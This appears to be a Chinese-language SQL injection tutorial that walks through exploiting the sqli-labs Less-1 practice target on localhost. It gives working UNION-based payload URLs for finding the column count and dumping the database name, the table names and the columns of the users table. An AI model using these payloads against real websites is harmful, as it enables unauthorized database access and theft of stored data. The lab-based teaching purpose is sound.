  SQL注入

  

  

                                     

    

                            

**1**

何为SQL注入

     

  

 SQL，指一门结构化查询语言  ，该语言一般用于访问和处理数据库，那我们的SQL注入的目的就显而易见了，即进入后台数据库，对后台数据库进行查看甚至是修改

  

  

**2**

SQL注入的原理

  

   把SQL命令插入到 Web表单递交 、 输入域名或 页面请求 的查询字符串中，最终达到欺骗服务器执行恶意的SQL命令

**3**

SQL注入的利用过程

1：判断是否存在注入

判断是否存在注入，关键看是否出现页面报错信息  

   （本次实验用的环境为自己搭建的靶机 sql\_labs）

  

    首先给参数赋值单引号，查看页面是否出现报错信息，如若报错说明该Web页面存在SQL注入，若没有出现变化，可能没有SQL注入，也可能有但需要特殊的方法绕过

  

  

在导航栏中的url末端输入单引号 ’，发现页面出现了报错信息，证明网站确实存在SQL注入

  

![](../Images/b8099aba921dad82f52634d86ac0684c.png)  

  

  

2：判断字段长度

通过使用order by语句来判断后台所查询字段的数目

  

   给参数赋值 order by （num），num为测试的数：1,2,3,… 当页面出错时，正确显示页面的最后一个num便为后台所查询字段的数目总数

  

  

我们在导航栏后输入 order by 命令，改变by后数值的大小进行尝试，发现当num=1,num=2,num=3时页面正常显示，但是当num=4时页面报错，于是我们发现了数据库的字段长度为3

  

```
代码：http://localhost/sqlilabs/Less\-1/?id\=1' order by 3 %23
```

3：判断显示字段的位置

  

  通过联合查询（union select 字段数）查看可显示字段，为下一步暴库（显示数据库内信息）做准备

  

  

在导航栏id=-1'后输入 union select 1,2,3#命令，进一步发现可显示字段为2,3.

  

```
代码：http://localhost/sqlilabs/Less\-1/?id\=1' union select 1,2,3 %23
```

  

  

![](../Images/e74ead347398d16fa6f1b12ee492f852.png)

  

  

4、爆数据库名

  

  

  

修改url后我们得到了数据库名

  

```
代码：http://127.0.0.1/sqli\-labs\-master/Less\-1/?id\=-1' union select 1,database(),3 #
```

  

  

![](../Images/c1758e37ad0e177c6b06447018024d71.png)

  

  

![](../Images/836c5b36a6e51a73dfe4d90945bb7b3c.png)

  

  

5、爆表名：

 利用group\_concat()函数将表名在一列中显示出来

  

  

  

我们将url修改后，得到了数据库的全部表名.

  

  

```
Payload：http://127.0.0.1/sqli\-labs\-master/Less\-1/?id\=-1' union select 1,group\_concat(table\_name),3 from information\_schema.tables where table\_schema ='security' #
```

  

![](../Images/2f58bea07ad5d82eb4a032fb2068dfa1.png)

  

  

6、爆列名：查找users表里面的列信息

  

  

  

然后我们开始爆列名

  

  

```
Payload：http://127.0.0.1/sqli\-labs\-master/Less\-1/?id\=-1' union select 1,group\_concat(column\_name),3 from information\_schema.columns where table\_name ='users' #
```

  

![](../Images/117b5caa59b30dfbf6473ebc88bc767a.png)
